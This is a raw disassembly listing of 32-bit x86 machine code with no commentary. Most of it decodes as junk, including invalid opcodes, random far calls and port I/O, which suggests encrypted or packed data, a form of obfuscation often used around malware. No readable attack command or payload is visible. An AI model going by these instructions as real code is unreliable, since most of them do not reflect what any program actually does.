  406c26:	sub    bl,bh
  406c28:	mov    dl,0x47
  406c2a:	or     al,0x2f
  406c2c:	(bad)  
  406c2d:	cmp    bh,dh
  406c2f:	sub    BYTE PTR [ecx-0x48ef2ce5],0x6d
  406c36:	mov    edi,0x1eaf9c6c
  406c3b:	imul   ebp,DWORD PTR [eax+0x63],0xdbdf016f
  406c42:	jne    0x406cac
  406c44:	std    
  406c45:	in     eax,dx
  406c46:	pushf  
  406c47:	add    DWORD PTR [eax],esp
  406c49:	stos   BYTE PTR es:[edi],al
  406c4a:	mov    eax,0x229614f3
  406c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c50:	jno    0x406c81
  406c52:	outs   dx,DWORD PTR ds:[esi]
  406c53:	clc    
  406c54:	pushf  
  406c55:	retf   0x4fec
  406c58:	test   eax,0xb87e546c
  406c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c5e:	xor    DWORD PTR ss:[esi-0x7b040695],0x75
  406c66:	and    BYTE PTR [eax],al
  406c68:	inc    eax
  406c69:	imul   ecx,ebx,0x17
  406c6c:	xor    ah,BYTE PTR [edi-0x47d3a9bc]
  406c72:	sbb    cl,BYTE PTR [edi-0x38]
  406c75:	das    
  406c76:	stc    
  406c77:	pop    esp
  406c78:	mov    ah,0x1b
  406c7a:	fucom  st(4)
  406c7c:	push   0x1d
  406c7e:	(bad)  
  406c80:	push   0x29
  406c82:	js     0x406c7f
  406c84:	in     eax,dx
  406c85:	das    
  406c86:	frstor [edx+edx*8]
  406c89:	retf   
  406c8a:	repnz into 
  406c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c8d:	adc    esi,DWORD PTR [esi+0x1e]
  406c90:	mov    bl,BYTE PTR [ebp-0xca42728]
  406c96:	inc    edx
  406c97:	es test eax,0xeb9461d0
  406c9d:	clc    
  406c9e:	xchg   ebx,eax
  406c9f:	push   ecx
  406ca0:	loop   0x406ce7
  406ca2:	add    ch,BYTE PTR ss:0xe1b19725
  406ca9:	mov    bl,0xc9
  406cab:	scas   al,BYTE PTR es:[edi]
  406cac:	xchg   ebp,eax
  406cad:	repnz mov bl,ch
  406cb0:	cs das 
  406cb2:	scas   eax,DWORD PTR es:[edi]
  406cb3:	clc    
  406cb4:	jae    0x406c8d
  406cb6:	cdq    
  406cb7:	sub    al,0x17
  406cb9:	ins    BYTE PTR es:[edi],dx
  406cba:	push   ds
  406cbb:	in     eax,dx
  406cbc:	sbb    cl,BYTE PTR [eax+ecx*8]
  406cbf:	xchg   ecx,eax
  406cc0:	or     dh,BYTE PTR [edx]
  406cc2:	test   al,0xee
  406cc4:	(bad)  
  406cc5:	pop    esp
  406cc6:	sbb    esp,DWORD PTR [esi+0x24d0913]
  406ccc:	or     eax,0x6384455f
  406cd1:	mov    eax,0x5c9ab6e1
  406cd6:	pusha  
  406cd7:	das    
  406cd8:	fidivr WORD PTR [ebx+0x1285dcf4]
  406cde:	add    DWORD PTR ds:0x7c1d84cd,ecx
  406ce4:	pusha  
  406ce5:	mov    ah,BYTE PTR [ecx]
  406ce7:	push   eax
  406ce8:	pop    edx
  406ce9:	imul   esi,DWORD PTR [ecx+edx*4+0x2a58e8f1],0x7ffac5f1
  406cf4:	inc    esp
  406cf5:	xor    DWORD PTR [esi+0x6feb78fd],ecx
  406cfb:	ins    DWORD PTR es:[edi],dx
  406cfc:	lods   eax,DWORD PTR ds:[esi]
  406cfd:	sub    eax,ebp
  406cff:	test   BYTE PTR [edi-0x20c2d77f],0xf9
  406d06:	call   0x5b76:0x829a7ce
  406d0d:	out    dx,eax
  406d0e:	sbb    BYTE PTR [edi+0x4c],dl
  406d11:	jg     0x406d65
  406d13:	es push ecx
  406d15:	inc    edi
  406d16:	pop    ss
  406d17:	and    bh,0xa4
  406d1a:	push   esp
  406d1b:	jb     0x406d5a
  406d1d:	loope  0x406d7f
  406d1f:	add    eax,0xf84bc1c0
  406d24:	cmp    al,0x16
  406d26:	push   cs
  406d27:	ret    
  406d28:	pop    ebp
  406d29:	mov    ah,0x7f
  406d2b:	fwait
  406d2c:	iret   
  406d2d:	jp     0x406d28
  406d2f:	call   0x60f8:0x1f86b64b
  406d36:	cdq    
  406d37:	mov    cl,BYTE PTR [eax+0x46f706aa]
  406d3d:	fs fs retf 0x304f
  406d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d43:	in     al,0xbf
  406d45:	push   ecx
  406d46:	pop    edi
  406d47:	mov    esi,DWORD PTR es:[ebp+ecx*2-0xf]
  406d4c:	sub    al,0xb4
  406d4e:	and    al,0xd9
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4338af,0x433793
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4338a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4337e3,0x43378f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x99
  406d91:	push   0x38400bac
  406d96:	jle    0x406e16
  406d98:	mov    esp,0x2b7e7e7f
  406d9d:	sbb    eax,0x69c72142
  406da2:	pop    edx
  406da3:	jle    0x406e15
  406da5:	stos   DWORD PTR es:[edi],eax
  406da6:	pop    ebx
  406da7:	nop
  406da8:	xor    DWORD PTR [ebx],0x7b
  406dab:	mov    DWORD PTR [ecx],esi
  406dad:	mov    ds:0x6ed9fb9d,al
  406db2:	into   
  406db3:	mov    ?,WORD PTR [ebp-0x579ec20e]
  406db9:	sub    edx,ecx
  406dbb:	inc    ebx
  406dbc:	or     ebp,eax
  406dbe:	call   0x2cbc:0x4990983b
  406dc5:	loop   0x406df0
  406dc7:	add    al,0x5f
  406dc9:	xor    BYTE PTR [esp+ebp*4-0x88ff718],dl
  406dd0:	push   edi
  406dd1:	cwde   
  406dd2:	mov    eax,ds:0x2d2edb4d
  406dd7:	adc    bh,BYTE PTR [eax+ecx*1]
  406dda:	shl    BYTE PTR [esi+0x7e],cl
  406ddd:	(bad)  
  406dde:	fldenv [ecx]
  406de0:	out    0x96,eax
  406de2:	or     DWORD PTR [ecx+0x60],eax
  406de5:	cmp    BYTE PTR [ebp-0x3b2b03df],0xe6
  406dec:	(bad)  [eax]
  406dee:	mov    edx,0x536a18ee
  406df3:	imul   eax,DWORD PTR [esi],0xffffff8b
  406df6:	or     al,0x18
  406df8:	push   edx
  406df9:	pop    edx
  406dfa:	pop    esp
  406dfb:	push   0x2d
  406dfd:	cld    
  406dfe:	pushf  
  406dff:	jbe    0x406e5e
  406e01:	aad    0x55
  406e03:	ja     0x406e34
  406e05:	jge    0x406dd9
  406e07:	(bad)  
  406e08:	mov    edx,fs
  406e0a:	mov    eax,ds:0xc050fd42
  406e0f:	sbb    BYTE PTR [ebp-0x16caf374],cl
  406e15:	sbb    dl,ah
  406e17:	or     eax,0xb8fd49f3
  406e1c:	popa   
  406e1d:	pusha  
  406e1e:	mov    ah,0xa4
  406e20:	sbb    al,0xac
  406e22:	sbb    edx,ebp
  406e24:	dec    eax
  406e25:	inc    esp
  406e26:	loope  0x406dfa
  406e28:	fwait
  406e29:	xchg   ebx,eax
  406e2a:	mov    ebx,0xdb940587
  406e2f:	into   
  406e30:	xchg   ebx,eax
  406e31:	sti    
  406e32:	out    0x61,al
  406e34:	cs push esi
  406e36:	nop
  406e37:	and    esp,DWORD PTR [ebx+0x63]
  406e3a:	scas   al,BYTE PTR es:[edi]
  406e3b:	outs   dx,DWORD PTR ds:[esi]
  406e3c:	stos   BYTE PTR es:[edi],al
  406e3d:	jnp    0x406ddb
  406e3f:	loope  0x406e83
  406e41:	leave  
  406e42:	push   es
  406e43:	jecxz  0x406e6a
  406e45:	sub    edx,DWORD PTR [esi]
  406e47:	fs mov esi,0xa38567f2
  406e4d:	ins    DWORD PTR es:[edi],dx
  406e4e:	out    0x67,eax
  406e50:	std    
  406e51:	icebp  
  406e52:	mov    ds:0xd41933a8,eax
  406e57:	xlat   BYTE PTR ds:[ebx]
  406e58:	and    BYTE PTR [edx+0x53c90018],ch
  406e5e:	mov    ebp,0x5c438b09
  406e63:	lock into 
  406e65:	scas   eax,DWORD PTR es:[edi]
  406e66:	mov    ds:0xbc53d39,eax
  406e6b:	daa    
  406e6c:	cmp    ah,bh
  406e6e:	scas   al,BYTE PTR es:[edi]
  406e6f:	js     0x406eb2
  406e71:	ficomp WORD PTR [edi+0x29]
  406e74:	daa    
  406e75:	scas   al,BYTE PTR es:[edi]
  406e76:	cli    
  406e77:	jg     0x406ee5
  406e79:	push   ss
  406e7a:	in     al,0xd
  406e7c:	or     BYTE PTR ds:0x82793447,bh
  406e82:	add    ecx,DWORD PTR [ecx+0x7]
  406e85:	dec    ecx
  406e86:	je     0x406e47
  406e88:	mov    esi,0xf10a33b0
  406e8d:	retf   0xb704
  406e90:	push   ss
  406e91:	inc    ecx
  406e92:	cmp    ecx,esp
  406e94:	xchg   ecx,eax
  406e95:	out    0x5d,al
  406e97:	add    al,0xee
  406e99:	and    BYTE PTR [edx+0x5eb8741d],ah
  406e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ea0:	hlt    
  406ea1:	adc    esi,eax
  406ea3:	inc    ebp
  406ea4:	call   0x5c00:0x76bf1ee
  406eab:	pusha  
  406eac:	fistp  WORD PTR [edx-0x4c887f47]
  406eb2:	fcmove st,st(6)
  406eb4:	test   eax,0x73da906e
  406eb9:	ret    
  406eba:	outs   dx,DWORD PTR ds:[esi]
  406ebb:	dec    ecx
  406ebc:	jnp    0x406e79
  406ebe:	dec    ecx
  406ebf:	mov    bl,BYTE PTR [eax-0x6a]
  406ec2:	cld    
  406ec3:	sub    BYTE PTR [edi-0x1afbb428],bl
  406ec9:	sub    BYTE PTR [esi+0x77],0xc9
  406ecd:	fcmovne st,st(2)
  406ecf:	cs pop ds
  406ed1:	xchg   edx,eax
  406ed2:	in     eax,0xc2
  406ed4:	(bad)  
  406ed5:	xchg   edx,edx
  406ed7:	inc    esp
  406ed8:	shl    BYTE PTR [ecx-0x38],cl
  406edb:	shl    DWORD PTR [edx],cl
  406edd:	(bad)  
  406edf:	repz or al,0xab
  406ee2:	jecxz  0x406f27
  406ee4:	pop    esp
  406ee5:	cli    
  406ee6:	fwait
  406ee7:	sub    BYTE PTR [ebx+0x595e5190],bh
  406eed:	or     eax,0x3f05df9a
  406ef2:	push   ecx
  406ef3:	hlt    
  406ef4:	(bad)  
  406ef5:	adc    al,0x47
  406ef7:	push   edx
  406ef8:	mov    bh,0x91
  406efa:	shl    DWORD PTR [edx+0x97310d7],0xa7
  406f01:	xchg   edi,eax
  406f02:	popa   
  406f03:	inc    edi
  406f04:	cdq    
  406f05:	cwde   
  406f06:	ror    DWORD PTR [ecx],0x50
  406f09:	pop    esi
  406f0a:	inc    ebx
  406f0b:	ficom  DWORD PTR [edi+esi*8]
  406f0e:	les    esi,FWORD PTR [ebx+0x3a2aff6e]
  406f14:	leave  
  406f15:	push   ss
  406f16:	lods   eax,DWORD PTR ds:[esi]
  406f17:	cmp    eax,0xf146e4e2
  406f1c:	cwde   
  406f1d:	pushf  
  406f1e:	inc    edx
  406f1f:	enter  0x522c,0x3f
  406f23:	cwde   
  406f24:	dec    edi
  406f25:	mov    cl,BYTE PTR [ebx-0x31f0ce2c]
  406f2b:	lods   al,BYTE PTR ds:[esi]
  406f2c:	sbb    esp,edi
  406f2e:	out    dx,al
  406f2f:	retf   0x34ea
  406f32:	dec    ebp
  406f33:	pop    edx
  406f34:	dec    eax
  406f35:	mov    ah,0x87
  406f37:	les    eax,FWORD PTR [edx+edi*1]
  406f3a:	in     eax,dx
  406f3b:	sahf   
  406f3c:	sub    al,0x37
  406f3e:	stos   DWORD PTR es:[edi],eax
  406f3f:	cld    
  406f40:	cmp    al,0x42
  406f42:	int3   
  406f43:	dec    edx
  406f44:	outs   dx,BYTE PTR ds:[esi]
  406f45:	lds    edx,FWORD PTR [esi+edx*8+0x2f4968c8]
  406f4c:	out    dx,eax
  406f4d:	mov    WORD PTR [ecx+0x3],cs
  406f50:	retf   
  406f51:	cmp    al,0xa4
  406f53:	pop    esp
  406f54:	mov    ebp,0xdee7c89d
  406f59:	xchg   esi,eax
  406f5a:	xlat   BYTE PTR cs:[ebx]
  406f5c:	call   0x8211669f
  406f61:	and    eax,0x43378f
  406f66:	shl    DWORD PTR [edi],cl
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x6101a86b
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xbf7e7e7f
  406f9f:	xor    ebp,ebx
  406fa1:	mov    bl,0x82
  406fa3:	push   ds
  406fa4:	inc    BYTE PTR [ebp+0x101b2ff]
  406faa:	hlt    
  406fab:	or     DWORD PTR [ecx-0x7d],ebx
  406fae:	out    dx,eax
  406faf:	pop    ebx
  406fb0:	adc    al,0x49
  406fb2:	mov    dh,BYTE PTR [eax]
  406fb4:	retf   
  406fb5:	call   0xf1976502
  406fba:	jmp    0x407012
  406fbc:	retf   
  406fbd:	popa   
  406fbe:	addr16 jl 0x406fcf
  406fc1:	adc    BYTE PTR [eax-0x369e6916],dh
  406fc7:	mul    bh
  406fc9:	pop    ss
  406fca:	sub    al,BYTE PTR [edi+eax*1-0x4d]
  406fce:	dec    edx
  406fcf:	inc    esp
  406fd0:	and    DWORD PTR [ebx-0x38],ecx
  406fd3:	add    eax,DWORD PTR [ebx-0x32]
  406fd6:	rol    DWORD PTR [edi+0x24],cl
  406fd9:	in     al,dx
  406fda:	inc    esi
  406fdb:	(bad)  
  406fdc:	cmp    dh,BYTE PTR [esi]
  406fde:	nop
  406fdf:	or     al,0x85
  406fe1:	test   eax,0x80d9a5cc
  406fe6:	out    0xb1,al
  406fe8:	add    ah,BYTE PTR ds:0x5fb58ff0
  406fee:	xchg   ebx,eax
  406fef:	and    BYTE PTR ds:0xeee9505b,al
  406ff5:	dec    ebp
  406ff6:	adc    esp,DWORD PTR [edi+eiz*2-0x698da524]
  406ffd:	mov    ?,WORD PTR [esi+ecx*8+0x216f2d61]
  407004:	aaa    
  407005:	addr16 jbe 0x407038
  407008:	sti    
  407009:	fnstcw WORD PTR [ebp+0x1d]
  40700c:	pop    ss
  40700d:	jmp    0xfccf:0xf7d6c064
  407014:	out    0x31,eax
  407016:	fdiv   QWORD PTR [eax+0x2]
  407019:	fdiv   st,st(3)
  40701b:	mov    BYTE PTR [edi+0x7ff6ae20],ah
  407021:	and    eax,eax
  407023:	xchg   ebp,eax
  407024:	rol    DWORD PTR [edx-0x1f195640],cl
  40702a:	or     DWORD PTR [edi+0x1f1af123],ecx
  407030:	leave  
  407031:	out    0x3e,al
  407033:	pop    esi
  407034:	mov    dl,BYTE PTR [ebx+0x3f]
  407037:	(bad)  
  407039:	(bad)  
  40703a:	das    
  40703b:	inc    esp
  40703c:	cmp    eax,0xc9ca48c0
  407041:	add    ebp,DWORD PTR [eax+edi*1-0x9]
  407045:	jle    0x406fcf
  407047:	and    bl,bl
  407049:	jle    0x406ffa
  40704b:	add    bh,BYTE PTR ds:0x112354ac
  407051:	mov    ds:0x49c03ed9,eax
  407056:	push   esp
  407057:	pop    edi
  407058:	fcomp  QWORD PTR [ebx-0x7f4c4715]
  40705e:	imul   eax,DWORD PTR [ecx+0x5d200114],0x10ce8648
  407068:	mov    al,BYTE PTR [edx+0x7b]
  40706b:	ret    0x2025
  40706e:	data16 (bad) 
  407070:	stos   BYTE PTR es:[edi],al
  407071:	pop    ebp
  407072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407073:	cmp    ecx,ebp
  407075:	xchg   ah,bl
  407077:	or     al,0x7d
  407079:	arpl   WORD PTR [ecx+0x65],sp
  40707c:	pop    esi
  40707d:	iret   
  40707e:	mov    ah,0x27
  407080:	mov    ds:0x1a0e9c5e,al
  407085:	mov    dh,0xb9
  407087:	jo     0x4070e0
  407089:	xchg   edi,eax
  40708a:	pop    es
  40708b:	or     DWORD PTR [esi+0x57],ecx
  40708e:	ins    BYTE PTR es:[edi],dx
  40708f:	xchg   esp,eax
  407090:	mov    DWORD PTR [ecx-0x6a],eax
  407093:	stc    
  407094:	add    eax,DWORD PTR [esp+eax*4-0x9]
  407098:	xchg   ecx,eax
  407099:	mov    cl,0x77
  40709b:	ins    DWORD PTR es:[edi],dx
  40709c:	sub    dl,BYTE PTR [esi-0x3f72d6f7]
  4070a2:	push   edx
  4070a3:	push   ebp
  4070a4:	test   BYTE PTR [ecx+0x11190970],dh
  4070aa:	pop    es
  4070ab:	je     0x4070dc
  4070ad:	(bad)  
  4070ae:	mov    al,0xb0
  4070b0:	dec    esp
  4070b1:	fdivr  QWORD PTR [esi+eiz*8-0x3f47871e]
  4070b8:	pop    edi
  4070b9:	(bad)  
  4070ba:	mov    esi,0xbfdef63c
  4070bf:	loop   0x407075
  4070c1:	fmulp  st(2),st
  4070c3:	jb     0x407093
  4070c5:	jmp    0xd75d:0x84359caa
  4070cc:	rol    BYTE PTR [ecx+0x1c51a08],0x33
  4070d3:	mov    ebx,0x136cc27f
  4070d8:	jge    0x407063
  4070da:	dec    edx
  4070db:	and    al,bh
  4070dd:	add    al,0x3f
  4070df:	mov    dl,0x8c
  4070e1:	mov    ch,0x14
  4070e3:	test   ebp,ecx
  4070e5:	jl     0x4070fc
  4070e7:	loop   0x407162
  4070e9:	inc    edi
  4070ea:	aad    0x30
  4070ec:	arpl   WORD PTR [edx+0x6b],dx
  4070ef:	mul    ch
  4070f1:	aas    
  4070f2:	jge    0x40707e
  4070f4:	jbe    0x4070e3
  4070f6:	add    BYTE PTR [esi+eiz*2+0x2d8e5006],dl
  4070fd:	xchg   esi,eax
  4070fe:	imul   edx,DWORD PTR [edx-0x54f5503b],0xffffffb1
  407105:	pop    ds
  407106:	jns    0x4070be
  407108:	(bad)  
  40710a:	or     eax,0x2e9b1f2f
  40710f:	sbb    DWORD PTR [edi-0x74],esp
  407112:	daa    
  407113:	sbb    DWORD PTR [ebp+0x14],eax
  407116:	shr    edi,cl
  407118:	mov    esi,0xcf3054d2
  40711d:	sbb    edx,DWORD PTR [ebx-0x5b66a385]
  407123:	adc    BYTE PTR [edx+0x75aafc6c],al
  407129:	jg     0x4070ac
  40712b:	xchg   esp,eax
  40712c:	mov    esp,0x6384d6de
  407131:	or     al,0xde
  407133:	xlat   BYTE PTR ds:[ebx]
  407134:	sbb    cl,bh
  407136:	lahf   
  407137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407138:	mov    ecx,0x85e4e21c
  40713d:	xor    BYTE PTR [eax+0xa],ah
  407140:	mov    al,0xd7
  407142:	out    dx,eax
  407143:	and    eax,0x42097e4c
  407148:	pushf  
  407149:	dec    esp
  40714a:	dec    edx
  40714b:	or     eax,ecx
  40714d:	sbb    eax,esi
  40714f:	(bad)  
  407151:	jae    0x4070e6
  407153:	or     esp,DWORD PTR [edx]
  407155:	add    DWORD PTR [ecx-0xdbb6030],ecx
  40715b:	cmp    DWORD PTR [edi-0x2a],eax
  40715e:	pop    ebp
  40715f:	push   0xe80875ff
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	out    dx,eax
  40717c:	xor    cl,BYTE PTR [ecx]
  40717e:	xchg   esp,ecx
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x9c7e7e7f
  407188:	jcxz   0x4071a5
  40718b:	xchg   BYTE PTR [ecx+0x10],ch
  40718e:	mov    ah,0xd1
  407190:	into   
  407191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407192:	push   edi
  407193:	rcl    BYTE PTR [esi],cl
  407195:	inc    eax
  407196:	jne    0x40712e
  407198:	int3   
  407199:	dec    ecx
  40719a:	jl     0x4071b2
  40719c:	mov    ds,WORD PTR [ebx+0x310bc22b]
  4071a2:	shl    BYTE PTR [eax+0x15],cl
  4071a5:	cmp    eax,DWORD PTR [edi-0x5b]
  4071a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a9:	cmp    al,0x4b
  4071ab:	xchg   ebp,eax
  4071ac:	sbb    ah,BYTE PTR [ecx+ebp*2-0x74]
  4071b0:	jecxz  0x407212
  4071b2:	mov    edx,0x72a72efc
  4071b7:	mov    edx,0x10325ebe
  4071bc:	mov    WORD PTR [ecx+0x59],es
  4071bf:	inc    BYTE PTR [ebp-0x63]
  4071c2:	push   ecx
  4071c3:	or     DWORD PTR [esi+esi*8],edi
  4071c6:	std    
  4071c7:	pop    edi
  4071c8:	clc    
  4071c9:	and    BYTE PTR [edx],cl
  4071cb:	inc    edi
  4071cc:	shr    BYTE PTR ds:0x5b9a8f37,cl
  4071d2:	nop
  4071d3:	dec    esp
  4071d4:	loopne 0x40720d
  4071d6:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4071d8:	icebp  
  4071d9:	in     al,dx
  4071da:	and    DWORD PTR [edi],edx
  4071dc:	mov    esi,0x452bd65
  4071e1:	xchg   ebp,eax
  4071e2:	(bad)  
  4071e3:	sar    DWORD PTR [edx+0x44dae5c1],cl
  4071e9:	sar    DWORD PTR [ebx-0x23d4be27],0x25
  4071f0:	test   BYTE PTR [eax-0x189780bf],ch
  4071f6:	mov    eax,ds:0x29ca2c8f
  4071fb:	mov    ds:0xb8ceb50d,al
  407200:	fild   DWORD PTR fs:[ebp+0x346fc966]
  407207:	idiv   BYTE PTR [edi*4-0x7739f695]
  40720e:	daa    
  40720f:	enter  0xb95,0x90
  407213:	loope  0x40727f
  407215:	xchg   edi,eax
  407216:	cmp    eax,DWORD PTR [ecx+0x75fa81a5]
  40721c:	lock sahf 
  40721e:	dec    esp
  40721f:	inc    ecx
  407220:	push   esp
  407221:	mov    eax,0xc87d7455
  407226:	xor    DWORD PTR [eax],ebx
  407228:	call   0x6584fc68
  40722d:	jecxz  0x4071da
  40722f:	jae    0x4071ca
  407231:	jmp    0x407283
  407233:	iret   
  407234:	xor    bh,BYTE PTR es:[ebp-0x2e]
  407238:	mov    ebx,0xc21dd143
  40723d:	xor    WORD PTR [eax],cx
  407240:	mov    al,0xff
  407242:	mov    ebp,0x1531504b
  407247:	push   0xffffffc7
  407249:	ficom  DWORD PTR [ecx-0xea3cf14]
  40724f:	cld    
  407250:	mov    ebp,0xfddac18a
  407255:	mov    eax,ds:0x2decfb1d
  40725a:	pop    ebx
  40725b:	pusha  
  40725c:	repz xor edx,DWORD PTR [ecx-0x5a]
  407260:	or     al,0xc8
  407262:	mov    bl,0x96
  407264:	icebp  
  407265:	int    0x92
  407267:	pop    ds
  407268:	int    0xc2
  40726a:	ja     0x407298
  40726c:	ins    DWORD PTR es:[edi],dx
  40726d:	xchg   BYTE PTR [ecx],bl
  40726f:	mov    BYTE PTR [esi-0x326ad289],bh
  407275:	imul   eax,ebp,0x18
  407278:	add    eax,0x5923ad11
  40727d:	push   ebx
  40727e:	inc    edx
  40727f:	jle    0x40725e
  407281:	mov    bl,ch
  407283:	push   es
  407284:	sahf   
  407285:	sbb    al,0xa8
  407287:	xchg   dh,al
  407289:	arpl   ax,dx
  40728b:	shr    BYTE PTR [edx],0xad
  40728e:	stos   BYTE PTR es:[edi],al
  40728f:	mov    dh,BYTE PTR [ebp+0x338ff1e6]
  407295:	xor    dl,dl
  407297:	stc    
  407298:	mov    edx,0xd5affa7c
  40729d:	cmp    ebp,edi
  40729f:	sub    DWORD PTR [ebx],esi
  4072a1:	sub    dh,BYTE PTR [edi-0x4f2bff8a]
  4072a7:	and    BYTE PTR [ebp-0x143ba6d2],cl
  4072ad:	dec    ebx
  4072ae:	or     ebx,DWORD PTR [eax]
  4072b0:	or     DWORD PTR fs:[edi+eax*4],eax
  4072b4:	loop   0x407250
  4072b6:	pop    ebx
  4072b7:	clc    
  4072b8:	xor    DWORD PTR [ebp+0x58],ebx
  4072bb:	xchg   ecx,eax
  4072bc:	jge    0x40727d
  4072be:	jno    0x407268
  4072c0:	cmp    esp,DWORD PTR [edi+ecx*1]
  4072c3:	loope  0x407344
  4072c5:	mov    ds:0x4ba0d42a,al
  4072ca:	jecxz  0x4072e4
  4072cc:	sub    DWORD PTR [edi-0x48413f44],0xe
  4072d3:	loop   0x4072c6
  4072d5:	mov    al,ds:0xd9b2a118
  4072da:	mov    cl,BYTE PTR [eax-0x411d19f7]
  4072e0:	daa    
  4072e1:	in     al,dx
  4072e2:	es add ch,dh
  4072e5:	in     al,0xc7
  4072e7:	clc    
  4072e8:	scas   eax,DWORD PTR es:[edi]
  4072e9:	mov    ds:0xe693e38d,eax
  4072ee:	call   0xc7270c72
  4072f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072f4:	hlt    
  4072f5:	push   ebx
  4072f6:	test   DWORD PTR [edx],ebx
  4072f8:	mov    al,0x8a
  4072fa:	dec    ebx
  4072fb:	adc    DWORD PTR [edi+edx*1+0x28],esi
  4072ff:	push   0x8ee5e4f1
  407304:	push   edi
  407305:	cmp    al,0xd2
  407307:	dec    edx
  407308:	mov    ?,WORD PTR [ebx]
  40730a:	sub    al,0x96
  40730c:	frstor [eax+0x7c]
  40730f:	jp     0x40729b
  407311:	cld    
  407312:	arpl   WORD PTR [esi+0x39],ax
  407315:	cdq    
  407316:	xchg   ebp,edi
  407318:	jecxz  0x407326
  40731a:	shl    bh,1
  40731c:	imul   esp,DWORD PTR [ebx],0x37d3cb7b
  407322:	add    eax,0x3bae01b2
  407327:	inc    ebx
  407328:	mov    cl,0xbd
  40732a:	mov    bh,0x61
  40732c:	inc    esp
  40732d:	inc    edi
  40732e:	mov    es,eax
  407330:	div    DWORD PTR [ebx+0x6e39df3a]
  407336:	push   ebx
  407337:	fistp  QWORD PTR [eax+0x47084c09]
  40733d:	out    dx,eax
  40733e:	xor    BYTE PTR [ebx],cl
  407340:	lds    ebp,FWORD PTR [ecx]
  407342:	xor    dl,ch
  407344:	ja     0x4072cb
  407346:	addr16 js 0x4073b6
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4337d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4338ab
  40736f:	or     DWORD PTR ds:0x4338af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407332
  407387:	inc    ecx
  407388:	sub    eax,0x7ec20ad3
  40738d:	jle    0x407394
  40738f:	jl     0x40740f
  407391:	jle    0x407345
  407393:	std    
  407394:	ss loop 0x407320
  407397:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407399:	mov    al,0x27
  40739b:	stos   DWORD PTR es:[edi],eax
  40739c:	(bad)  
  40739d:	push   ss
  40739e:	jns    0x407378
  4073a0:	mov    al,ds:0x75cf1458
  4073a5:	out    0x71,al
  4073a7:	mov    bh,0x53
  4073a9:	dec    edx
  4073aa:	addr16 out dx,al
  4073ac:	mov    dl,0xa
  4073ae:	test   al,0xc3
  4073b0:	call   0xdba0715f
  4073b5:	sub    al,0x8b
  4073b7:	loop   0x407414
  4073b9:	pop    ss
  4073ba:	ret    
  4073bb:	jmp    0x4073e0
  4073bd:	jp     0x4073b6
  4073bf:	pop    edx
  4073c0:	fisub  WORD PTR [ebx+0x45a4c645]
  4073c6:	(bad)  
  4073c7:	xor    ah,dl
  4073c9:	xchg   esp,eax
  4073ca:	sub    BYTE PTR [edi+0x61],ch
  4073cd:	(bad)  
  4073ce:	mov    ebp,0x729f1ded
  4073d3:	xchg   ebp,eax
  4073d4:	out    dx,eax
  4073d5:	scas   eax,DWORD PTR es:[edi]
  4073d6:	clc    
  4073d7:	sbb    BYTE PTR [ebx+0x299b0de5],al
  4073dd:	out    dx,eax
  4073de:	enter  0x3319,0xe6
  4073e2:	pop    esp
  4073e3:	xchg   edi,eax
  4073e4:	sbb    eax,0x52e324e3
  4073e9:	outs   dx,BYTE PTR ds:[esi]
  4073ea:	aad    0x7
  4073ec:	clc    
  4073ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073ee:	sub    cl,cl
  4073f0:	in     al,0xdc
  4073f2:	sub    ah,BYTE PTR [edx]
  4073f4:	cld    
  4073f5:	push   edi
  4073f6:	and    ebx,esi
  4073f8:	jo     0x4073ad
  4073fa:	pop    esi
  4073fb:	xor    esp,DWORD PTR [ecx+eax*1]
  4073fe:	pop    ebp
  4073ff:	push   esi
  407400:	pop    ebp
